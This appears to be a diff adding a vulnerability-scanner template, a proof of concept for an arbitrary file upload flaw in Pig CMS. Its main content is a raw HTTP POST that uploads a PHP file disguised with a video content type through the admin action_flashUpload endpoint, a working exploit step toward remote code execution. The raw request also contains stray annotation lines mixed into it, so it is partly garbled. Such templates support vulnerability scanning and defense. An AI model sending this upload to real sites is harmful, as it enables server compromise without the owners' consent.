@@ -1,0 +1,56 @@
+id: poc-cf0nf54rhtxfx7t8
+info:
+  name: Pig CMS action_flashUpload 接口处任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cf0nf54rhtxfx7t8'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cf0nf54rhtxfx7t8
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=----HUHhuIUHNiugiuIUgbvgfCJH
+
+
+
+
+    ------HUHhuIUHNiugiuIUgbvgfCJH
+
+
+    Content-Disposition: form-data; name="filePath"; filename="ceshi.php"
+
+
+    Content-Type: video/x-flv
+
+
+
+
+    <?php echo "dudesuite";?>
+
+
+    ------HUHhuIUHNiugiuIUgbvgfCJH
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    .php
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
